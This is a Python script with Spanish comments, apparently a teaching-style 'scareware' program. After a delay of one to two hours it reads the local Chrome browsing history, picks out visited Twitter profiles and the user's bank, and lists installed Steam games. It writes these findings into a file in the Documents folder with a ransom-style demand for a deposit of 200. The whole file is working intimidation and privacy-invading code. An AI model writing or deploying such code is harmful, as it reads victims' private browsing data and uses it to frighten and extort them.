import os
import re
import sqlite3 # Conexion a una base de datos
from time import sleep
from random import randrange
from pathlib import Path # Libreria ruta home
import os.path, time
HACKER_FILE_NAME = "PARA TI.txt"

def get_user_path():
    return "{}/".format(Path.home())


def delay_action():
    # Esperaremos entre 1 y 3 segundos
    n_seconds = randrange(1, 3)
    print("Durmiendo {} segundos.".format(n_seconds))
    sleep(n_seconds * 60 * 60) #Horas de delay
    # sleep(n_hours * n_minutes * 60)

def create_hacker_file(user_path):
    hacker_file = open(user_path + "/Documents/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola soy un hacker y he entrado en tu sistema, deposita 200 en esta cuenta, si no....\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial Inaccesible, reintentando en 5 segundos...")
            sleep(5)

# Usamos Regular Expresions (REGEX)
def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history[:10]: # (:) Hasta la entrada 10
        # Hacemos un filtrado en una ruta en común, filtramos las rutas en comun para solo encontrar cuentas en twitter
        # () Los parentesis se usan para capturar solo los valores requeridos
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que haz visitado los perfiles {} de twitter, wow....".format(", ".join(profiles_visited)))


def check_bank_account(hacker_file, chrome_history):
    user_bank = None
    banks = ["Banamex", "BBVA", "Santander", "Banjercito", "HSBC", "Azteca"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                user_bank = b
                break
        if user_bank:
            break
    hacker_file.write("\nAdemas veo que guardas el dinero en {}, ok....".format(user_bank))


def check_steam_path(hacker_file):
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common"
    games = os.listdir(steam_path) # Obtenemos el listado de los items que hay en un directorio
    user_games = None
    ignored_directories = ["Steam Controller Configs", "Steamworks Shared"]
    for game in games:
        for directory in ignored_directories:
            if directory.lower() != game[0].lower():
                user_games = game
                break
        if user_games:
            game_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\" + user_games
            break
    hacker_file.write("\nY no solo eso, he visto que juegas {} en tu computadora a las %s, mmm....".format(user_games) %time.ctime(os.path.getmtime(game_path)))



def main():
    # Esperamos entre 1 y 3 horas
    delay_action()
    # Calculamos la ruta del usuario de Windows
    user_path = get_user_path()
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Recogemos su historial de google chrome, cuando sea posible...
    chrome_history = get_chrome_history(user_path)
    # Escribiendo mensajes de miedo
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    # Banco de Usuario
    check_bank_account(hacker_file, chrome_history)
    # Juegos jugados por el Usuario
    check_steam_path(hacker_file)


# Distinguir cuentas en twitter / Pulir en el tiempo que pasa para que corra otra vez el programa
if __name__ == "__main__":
    main()